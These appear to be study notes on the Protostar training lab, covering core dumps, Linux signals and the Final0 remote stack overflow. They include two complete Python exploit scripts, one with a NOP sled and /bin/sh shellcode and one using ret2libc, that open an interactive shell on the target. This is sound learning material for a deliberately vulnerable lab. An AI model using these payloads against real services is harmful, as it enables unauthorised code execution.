### 0x1C Linux Signals and Core Dumps

- Introduces what are core dump files (files which are generated as a result of a program unexpectedly terminated and record the state of the memory during the crash)

- Introduces what are Linux Signals (some of which you already know such as SIGINT when you run CTRL-C on gdb)

- How to debug final0, final1, final2:

    `gdb /path/to/binary /path/to/core/file`

### 0x1D Final0 Remote Stack Buffer Overflow Exploit

- For this exercise, we are to perform a remote BoF exploit given tht the program uses the unsafe gets() function to receive input for the username.

- Take note that for net0 - net1, the way that the program receives input is via fread(), read(), and fgets() which are all generally safe functions whereas for this challenge, we are using gets(), and gets() reads input till it receives the "\n" nextline character. Hence, when we are sending our input, we need to append all our inputs with "\n"

- Answer (using normal BoF):

    ```
    import socket
    import struct
    import time
    import telnetlib
    
    HOST="127.0.0.1"
    PORT=2995
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    
    eip = struct.pack("I", 0xbffffc60+10)
    nopsled = "\x90" * 100
    exploit     = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
    payload = "A" * 512 + "\x00"  + "bbbccccddddeeeeffff" + eip + nopsled + "gggghhhhh" + exploit
    s.send(payload + "\n")
    #s.send("id")
    #data = s.recv(2048)
    #print "Received: ", data
    
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
    ```

- Answer (using ret2libc)

    ```
    import socket
    import struct
    import time
    import telnetlib
    
    HOST="127.0.0.1"
    PORT=2995
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    
    _SYSTEM = struct.pack("I", 0xb7ecffb0)
    _EXIT   = struct.pack("I", 0xb7ec60c0)
    _BIN_SH = struct.pack("I", 0xb7fb63bf)
    _EXECVE = struct.pack("I", 0x08048c0c)
    
    # payload = "A" * 512 + "\x00" + "aaabbbbccccddddeeee" + _SYSTEM + _EXIT + _BIN_SH # system() ret2libc
    payload = "A" * 512 + "\x00" + "aaabbbbccccddddeeee" + _EXECVE + _EXIT + _BIN_SH + "\x00" * 4 + "\x00" * 4 # execve() ret2libc
    s.send(payload + "\n")
    
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
    ```

    - For ret2libc using execve, you will need to find the address of the execve function using `(gdb) info functions @plt` and you will have to add 2 * `"\x00" * 4` to represent the gid and uid parameter when running execve("/bin/sh", 0, 0) (see documentation/manual for more information)


### References

https://wiki.archlinux.org/title/Core_dump

https://exploit.education/protostar/

https://www.ibm.com/docs/en/zos/2.2.0?topic=functions-gets-read-string 

https://www.educative.io/answers/how-to-use-the-fgets-function-in-c

https://man7.org/linux/man-pages/man2/read.2.html

https://www.ibm.com/docs/en/i/7.4?topic=functions-fread-read-items


